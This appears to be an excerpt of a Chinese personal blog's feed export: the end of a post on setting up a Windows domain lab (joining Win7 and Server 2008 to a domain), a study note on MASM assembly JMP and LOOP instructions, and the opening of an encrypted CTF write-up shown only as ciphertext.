<h5 id="加入域"><a class="anchor" href="#加入域">#</a> 加入域</h5>
<p>将该计算机 IP 地址设置为 <code>10.211.55.7</code></p>
<p>子网掩码设置为 <code>255.0.0.0</code></p>
<p>设置 DNS 为 <code>10.211.55.12</code>  和 <code>202.102.154.3</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125172534652.png" alt="image-20211125172534652" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125172510243.png" alt="image-20211125172510243" /></p>
<p>如果 ping 无法请求，查看是否关闭防火墙；<br />
 如果返回 IPv6 的地址，关闭 IPv6 即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125639375748.png" alt="img" /></p>
<p>然后修改计算机名为 &quot;Win7-computer&quot;。重启。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125172843354.png" alt="image-20211125173149699" /></p>
<p><span class="exturl" data-url="aHR0cDovL3huLS0yMXIwMDAtaHcyam84MmI3OWEub3Jn">填写域 21r000.org</span>，点击确定。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125173401381.png" alt="image-20211125173401381" /></p>
<p>输入域控主机 server 2012 的用户名和密码。可成功加入 21r000.org 域</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125173623529.png" alt="image-20211125173926007" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125173950959.png" alt="image-20211125173950959" /></p>
<p>重启计算机后，可使用 21r000O/21r000@666 登录域。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125174639227.png" alt="image-20211125174639227" /></p>
<h4 id="winserver2008"><a class="anchor" href="#winserver2008">#</a> winserver2008</h4>
<p>大致上和 win7 的操作一致</p>
<p>重命名 server 2008 计算机名为 Winserver2008<br />
 更改 administrator 账户密码</p>
<figure class="highlight css"><figcaption data-lang="CSS"></figcaption><table><tr><td data-num="1"></td><td><pre>net user administrator 21r000@2008</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125211613626.png" alt="image-20211125211613626" /></p>
<p>将该计算机 IP 地址设置为 <code>10.211.55.8</code></p>
<p>子网掩码设置为 <code>255.0.0.0</code></p>
<p>设置 DNS 为 <code>10.211.55.12</code>  和 <code>202.102.154.3</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125211756176.png" alt="image-20211125211756176" /></p>
<p>配置好后，和之前一样 ping 一下，检测是否成功</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125212112180.png" alt="image-20211125212112180" /></p>
<p>然后修改计算机名为 &quot;Win2008-computer&quot;，重启。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125212417742.png" alt="image-20211125212417742" /></p>
<p>server 2012 域控新建给的用户和密码为：21r000OO/21r000@666</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125180540565.png" alt="image-20211125180540565" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125212650622.png" alt="image-20211125212650622" /></p>
<p>成功得到欢迎弹窗，重启。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125212734573.png" alt="image-20211125212734573" /></p>
<p>再次检测</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125212858499.png" alt="image-20211125212858499" /></p>
<p>配置欧克！</p>
<h3 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h3>
<p>接触域的第一天 yeyeye，简单了解了一下工作组和域概念，重点还是在域环境的搭建吧 23333。</p>
<p>虽然有点小失误，但问题不大，及时改正即可了。</p>
<p>总的来说只有域控的配置有一点点麻烦，域用户的配置倒是没什么，照本宣科就好啦。</p>
<p>参考资料：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvMkpkTVJnQTlUbENWNWh3TzZpaFZXUQ==">内网学习笔记</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvNXdnQ0dIckU1TU5zS3ZOOXJDaEJzdw=="> 内网渗透 | 工作组和域的区别</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYmktalNtUlJ2bzc3N1dqTnJVTTdPUQ==">工作组环境中进行内网渗透常见方法总结</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kMWRmODU2MDIxMGM=">域环境的搭建</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之JMP和LOOP学习</title>
    <url>/article/28bedc94.html</url>
    <content><![CDATA[<p>通过这篇文章带你了解汇编语言中的 <code>jmp</code>  和 <code>loop</code>  的使用，而事实上这两个东西就相当于 C 语言中的<strong>跳转</strong>和<strong>循环</strong></p>
<ul>
<li>
<p>jmp 就是无条件跳转</p>
</li>
<li>
<p>loop 就相当于 C 语言中的循环</p>
</li>
</ul>
<p>通过对它们的学习，就能解决我们分支和循环的问题。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/9c4db145dde5ebc5e29a173bdcb9d46.png" alt="image-9c4db145dde5ebc5e29a173bdcb9d46" /></p>
<h2 id="jmp学习"><a class="anchor" href="#jmp学习">#</a> JMP 学习</h2>
<p>先用一个简单的样例进行测试，观察 <code>jmp</code>  的作用</p>
<h3 id="无jmp作用的代码"><a class="anchor" href="#无jmp作用的代码">#</a> 无 jmp 作用的代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	inc eax<span class="token punctuation">;</span>inc相当于C语言中的 <span class="token operator">++</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="23"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="24"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="25"></td><td><pre>END main</pre></td></tr></table></figure><p>在经 <code>inc</code>  递增之后可以看到 eax = 1</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124203209945.png" alt="image-20220124203209945" /></p>
<h3 id="有jmp作用的代码"><a class="anchor" href="#有jmp作用的代码">#</a> 有 jmp 作用的代码</h3>
<p>添加 jmp 作用之后，再观察 jmp 的作用效果</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	inc eax<span class="token punctuation">;</span>inc相当于C语言中的 <span class="token operator">++</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	jmp lp</pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><p>可以看到此时在 inc eax 处是已完成清零操作的</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124203652098.png" alt="image-20220124203652098" /></p>
<p>再在 jmp 处进行调试可以发现此时 eax = 1 了</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124203834706.png" alt="image-20220124203834706" /></p>
<p>此时再在 <code>jmp</code>  处进行调试可以发现自动跳转到 <code>lp</code>  那对 <code>inc eax</code>  进行执行</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124204028019.png" alt="image-20220124204028019" /></p>
<p>再进行一次测试可以发现 eax = 2 了</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124204218892.png" alt="image-20220124204218892" /></p>
<p>不难发现 jmp 对其后的标号进行跳转，且无条件跳转</p>
<h2 id="loop学习"><a class="anchor" href="#loop学习">#</a> LOOP 学习</h2>
<p>相比于上面 <code>jmp</code>  的死循环， <code>loop</code>  的循环次数更为可控</p>
<p><strong>测试代码</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	xor eax<span class="token punctuation">,</span>eax<span class="token punctuation">;</span>清<span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token number">10</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	inc eax<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p>给 <code>ecx</code>  赋值为 <code>10</code> ，可以看到在第一次测试的时候可以看到 <code>ecx = A</code> ，即 <code>ecx = 10</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124204941844.png" alt="image-20220124204941844" /></p>
<p>对 <code>eac</code>  进行测试可以看到 <code>eax</code>  经过一次执行后变成了  <code>1</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124205017287.png" alt="image-20220124205017287" /></p>
<p>执行一次 <code>loop，</code> 可以看到 <code>ecx = 9</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124205133133.png" alt="image-20220124205133133" /></p>
<p>再次调试可以发现 <code>eax = 2</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124205208818.png" alt="image-20220124205208818" /></p>
<p>而 <code>ecx</code>  变成了 <code>8</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124205243935.png" alt="image-20220124205243935" /></p>
<p>通过上面的测试可以发现：每执行一次循环 <code>ecx - 1</code></p>
<p>这里 <code>loop</code>  指令的作用便是一直重复执行 <code>inc eax</code></p>
<h2 id="利用loop进行字符串拷贝"><a class="anchor" href="#利用loop进行字符串拷贝">#</a> 利用 loop 进行字符串拷贝</h2>
<h3 id="测试样例"><a class="anchor" href="#测试样例">#</a> 测试样例</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>source byte <span class="token string">"My name is 21r000"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>源字符串</pre></td></tr><tr><td data-num="16"></td><td><pre>target byte <span class="token keyword">sizeof</span> source <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>目的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">;</span>利用<span class="token keyword">sizeof</span>伪指令计算源字符串大小</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token keyword">sizeof</span> source<span class="token punctuation">;</span>计算有效元素个数</pre></td></tr><tr><td data-num="24"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	mov al<span class="token punctuation">,</span>source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">;</span>获取第esi个字符</pre></td></tr><tr><td data-num="26"></td><td><pre>	mov target<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span>al<span class="token punctuation">;</span>将源字符串存入目标字符串</pre></td></tr><tr><td data-num="27"></td><td><pre>	inc esi<span class="token punctuation">;</span><span class="token operator">++</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	loop lp<span class="token punctuation">;</span>执行循环</pre></td></tr><tr><td data-num="29"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>可以看到 <code>mov ecx,sizeof source</code>  计算了有效元素个数</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124210911818.png" alt="image-20220124210911818" /></p>
<p>取地址查看 <code>&amp;target</code> ，可以发现目标字符串已完成拷贝。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220124211120794.png" alt="image-20220124211120794" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯_mailbox2</title>
    <url>/article/ec7d43d7.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容！">
  <script id="hbeData" type="hbeData" data-hmacdigest="d3d7500238dde82425f0148760e5eedeca54529479a8439a4e838e249001235e">d76042c691285ac2af8ff8de417732634be2a54a9e5360c45f170950f4fd2b9bd4eb7f5ce31997e90e6816d147c782687bbcf1380411a166098d3a1ed28ef337a5ac5639723c7052793aa77e21a9808592bd605cb1767b78f23b625df217093b7ebe09ea167d74702c5c17327348fb5027b354c0d0a7d93b852ff2a257d8caaf30a3eb6293bd23ca2b0009f94c14681d46432997bf6330bfdbde9ae5b0ada96e921643028d77602eef22358af8257f18c85e672f1d9617249a0c0a99121f200f646ebe596270464a091db0104de4e97b338396de6bb4964457c1598c473a86b7ff73754b0e8678bf8310d54be2a1774fc3c0ae93cdebb5af518ef0b8e45f16d26153c086206343902530ffda22c4f6a53eb4c131d91559db22abb012bba33999a28a54321f1aac60ba9f3e08055f185eaa3554e295b64395e851635a91c18e59376b07d86932cfba475754328b5de5b9192d90c4d39c85f1bf62de5331e7c02801535daa2dd760260bda5fc0049445df956b313b49639f5e403168dc7c600b0b015f5655905e4fcf76a11619ca3a8c981031f5629776fcf8bea202f5231399fed917ad63b3d6d63eb6a1f8f46feb0c698d416c2aae584bf80d1adba90890bff93a2167b4e861561362b3e9e0d7a5b3cae6e3713ce4298ee0de0218cd10f7a8b0867941252be86a833b7a15d5ccd400e4d6e840153b83079b484d99e2ffb257ac52db097d8c6a551cc4a40bc9ce3cf3256be58bab31b4e8aa8d30554c11bc16cd972b65c3b0679eb17d53339490e2d1a9294608ca8c510c51db0c44066f9aa7e0cf3088874863fcc277d154b9bfb13d7dc5c9754438f85627d44a291f53bca28b233739479a90e94986f63b4f52faaaa294b702f08e51297d13254086fd31eb5015938d19b41ba6f5a0603d7875289e4b2dbfa00aca02a2530c3ef1cf0fa2a37e7ee47955fa6a454cafe664ffd94a44eb0f7a6ecf6a3f79b2d64e3485d4f64ba8a2467482e352bba3c0838bc2513f10dc9d87ef5698f8983b3eadf2671b4a641eb61c24ed2c783bbf5628089dc5cc864986ee132c2d35c49fb4762e08cec0917e21c564fcc95387a8aa03b99030be19f27590b3dc21a2a825f6bb2c0976c6609d85b8b1c943785346d9c52b20f1e66031cbff908937048eb2c2f976d96a6758c62c72f776427fdaac8d28c1fd303b1952dca6b1dee62eeab692dc7f716ecdecb8269cfab246846bf30ddde200a108049914b635a32546deed86d3cfbb8420ea162f38958e6e38f0edcbe6ce5f041d07f43ff8fe5d4bd73de43d64ff407feb8cd8b403d5bd0c5c3d6636a50a994706c62ff75ac26e6eb806c6fe24b7276051ed8eb159735c14e64400cd918c6b8b68510dad8efc0b580b80bd5ac95a1dddde932d667d5a80f64b06a689bfce57742f4ed95c0c1ba3498d48c38fd1925f996e049cb4e8e44d7569409dbd90087fa2496b018820ba10d7371747e40d551502317f52dc3757462e0feab8dae75a6c3fbea1b9be8354533c3a731e36c24caa317286262d21f17975018b0d01da5df1a40dfb856fde58789c167e784508adfd7b3ead11962f66a3d6e310d5403dc59e0bc4158a69956102a71c152ee6e0f76a0ab966202fee55b35f659d15b3c88740a2671b25b61b102df1792688de1c140e24fce0861f170457b47450bf6123c0e781a722a67c96614bfea52bc7f109877ea3497588a223c4ccce097120fa0e58148391d0a06aceae2c15f061a387ab9f45d4980a1bfbfb01bc5a92bc1beda10d31e9cc28233921658662619e5c8c5ae04206edcbfad4cc0df200b5258cbd11a37c70c4c6b36c9101843d98f8c430db97ba1610438eabbfcd77900b99eeea334bfcc712ffe6b7b4380b3c694fd5a923aa610408ae4ff477d716b08b87ef7a175e9dad0248dba6ffc8472df6ac881c435a155877ca899df6342c5f282a3466982dfd2d7130e588503050e7dc38689fd80ff3c81616dad5f3a6681ffe4250f5fef0c7be5dd7e8fffa88bb87879a48d4ccf89e52f7226590cc3cdb2c0c88a5763e73a8233b7056f9213dd7b3b42609bf551b2553e7fb5b0e8ab79ab1814d22c212b965135d86fc1e9f09b346982c373c58ca6bc8a50046cb3be3473c2b8f559bc690578cb9250aecbc2f189ea33b4f1bfe4b2929a565633a5833e1a1ab18162fec676fbbcc0478a66a9a17f81d899a2c5f262c8729abf3f9189fd88e9da6baca65707659eea8a8643370565f08807e8242a20a24d54bb8eb43acba8f406e868432a02da65685ce468c81666dfad5eb5699bc0e34c8fc9d0269e45f6b31b8425bb4db0fa2a0d1c1b71b66c4bee30d7d0cf65f5085ec4e2f789e0a48500b21d997531d7f9695326ca13a9d15ccadf2c055ba2e99b696eeefaead3ab2f4218ae7c160718434368b92a85f89439bd3e7b7729f1ec2a2fc1aee4edc8daa11e6466a5566f64a5e4f94363514e36a1eef949866f8a8847309b3d8f7cc76af3622792a1a76e1e95f0db657276638a69c2025a4ee68af3b65cb27c801e41102cd63f3ff55fb8506ffb6fe090543e4f8823da4bffc5313dc6544b9a00e827c8b2f8f24197143ea57027f95e4cd5df7b506749d32bcbd086d1e47cca0c0b4f70bc476d24f79a1844ccb7cedb529ee8b8a0159eb798a77902351ff9c101bf40aed737d0bd697885d6b76930ff62744179b7c8cd1b79f87aa9331dfa42211bf3177fbfe90fe0b0f34fffc7dafa8e44db5400fbb9bca9c4667aca561d56fa78ae20effbc6414c70fe2428e0d043d2e2b4dabd35781bf96a1452c3d7edab4164dc63cff4d5994d5478a7fd47e1dc60ee13c9c376687cbc45bc0f1584a371bb2553de2b4cb9db3f7c3c2eefcf9a3a169fb6b7c2e954657a90f740afb573873b01af3c16693f6ff7fa5b49365a868972e0aa52ef5f2d5dc283170b933cd300ce54d8eb63670893709f9b11fd6e83a074b7f89151f0b8b35b4eaeddabbf831ddfb88d5cb900ae582d5d331c02d31810ec6068710114e579372a81132df9362bf526249da4e2e905ee96a290a31fad93b2a965a9aead5aef876ff943fc6ffd994a4788880b741a9b25cd88810551441fbda80001f78d0622f49514bfb84b200250fd99e87f158d73b2dc37ace9784e5544990a9ffc9187bc84a651ad384aab316e36c93d67c262b7cbab373e5d25b342cfe4fbbe40da2db73819d907b69e162a843cf24ee611d84a640b7767b44782ebff945a4110470ab2a19b40531dad75e43afdb87a39c4495ec2139b8ca7e2d923353f73ce7e96045490fb1f9d6cb674e36de496352b8803e7aaa110120c0e9c7969f4926f21a77edffee0fc5be5fc6d676c34686fb26df4634ace67f8b4f0a9568cf1c642dd0aa73a02d2ff48106942b5d3138501005e7e84bf5a6402914efafc476cf5970776d19dfb52c6fc6f2827c83621b62a41f2e81bda08660335f6bebbf76451c65eea086755f97f1b3915178f777863c7b3c7c48b2e386b9f862947d0f7b657177fb9162279a5d48d387ea3ae8a8e4f60901219683c2f8f7a3e2be8818b6d190810f6ed989e1407eecfedebb6fb755452b988816546537a2f3e3fe06ec0d260378130d4ef224e4e6c554518b1d3c60561ee2c8d168bf65cb54b68f69321aa61f6cba74e910823e8818a024073e9786520dd340a95424b2e0d5d8648ac9a20ac64ab12aa8e5f822f2695b8d2c30f398b1f5596da1ad8a2fc905a346b8d17f6414b114c1db3b6947f5ab16dc918486b0a9797a732bc5ddd975a560617fd7fe543c888a2adcf6cbf63016d2fb53282a8d6fcd331cebad9ebb3ca67bde9a1b7db39a1c635e817fa711e665fe3efd2288de6ed2096c491a84db86a73c09503331a5b37c413b5fb3df114442efd3ed4f0fd981cb1e97e062294b748e0855f615eb1e078b9157b502334909617964124f994aaa846d18de841940648118d72b49350c232db3119d776d35341e8d254192c07f513a91d721dbd99cb0664becb5ab409e5874a96c6c236e16650e094a3d924b4b2973f2cda500cf7eed56f0ea1184b41243fa411fe359e8c32caaaa36cf20d01416fb5c30044f963f19988072b53e896371f413e7bffcc3ab97230062de2babd868a2c5031212d98f0cca19f2b7a58900321904591f81c512bafd3b73204ec58de281c1580f932871a0d89a361e77f38a5e9520c308e0eb6d582a5c29736b1662863391336d76cf01e88a608a89eac637a0937d37a730b803c7ce257096adc789489d1da00eb0a9c12accce9caecac4c4d7e11c51009ae9bfbc92f71f3490f76b010263503c7fbca85bb14f292882c4e721cead50d7028f0e7335c652bd6e20ca703ef5db40e59935b7a555fb48b56568215b4e8624ff3bca5b3944b09ff5ea1e915d78edbed4213de836225a39bbc495e1a2f1ae70c2f607b3d632a0c45cb5f6b2967d16d5a35973f71621ee0a2a7ab87baf13a814ca816b549eebf4b2f8aed550946c03366d9c2d675f83adc6c7a172f0ecf792005c5873ee1562490d40f1bab4f8fa5db529864555d792796a1e094c5c26d5d9de55f4cd01fa04dae418838bee5143e178b4f6a4f2edb515eb06b975dec169cc4489a973dc52f37c8fda1811f15170cd4aa65696f79d65326253906a934f305a7b91452493a686b351b83cdd3c56b36b33ced17afbe0e41867dc3b0773b0fdb7efc9762fe3737d4be4f82b3f546c649a2d7d45d31efa9fdd8aa3145c236053ca0059638b409362739256d1e4b2366ce12bf1b1d7951b01bdd297e56bd7ca96bd42f7a46ff582d67b72ed35106878761bdd09aa896ab018321e73391fabcd7b7514b7d165e2e122303663a5fdfc910e40d7f447af8e3d750a143616d7b53bc8609acdfd7c7e9879a19fd0b6b8c505625ae78b9a868c1321d3b9ba0f9814ab45224dbff537d20c66cd22451f183c6f767b782ab4767128e5e4d306f93f26c4360084813db110c8188b273e1b21a3905dbac6b0a2c778dd2876c4cc4ef2131fa8edd2b64bc0b0c6746275364dd9bee8f4f85dd5db5532e94eed949aea0a8f393fe877f9641bff09f120de13bc360686ece02b7081aeb2e96852d0e97cd5dba9cbc696e95063a9a9cb8f307551f1520c03b86252729853c4ab07fb95d8eb3443eb4621b58fd95dfd32c3c4ee1d97b1d4b1ce520159babe4d5db7825dd0fbb802ea6f3999f14d9942fdb55868d3235c4dbbc9bd57c90b38869d6ef4f772bf2c96413558bcb3eef88297161ca9feca97c29718f1258fd3e2f82f18254c76b7c1d1b637f4662722418380435547d7d6f7769d7cce12f2abe7dd02dd9e4e246915642eb570938194b187ca2eaf2fd8485b15aa293bbb69a765b925b9351cd81922e2ff313929bbd7afd8a96d4b952aaebe7fd9111335d00d4b1d87817052ab4f0c5016458cfb369d68bbc448ce396331506766a170c4ea67c5c94d41022e9f5d40409b7e1d70b008ff43c3779819356308621da748557d2263996d2d118ae78d95677640f0c2387dcbaa99779b82c647930c50830b198ee2de769eeccb64cf5ebac24472b9310b245cf6d107bb1ba42211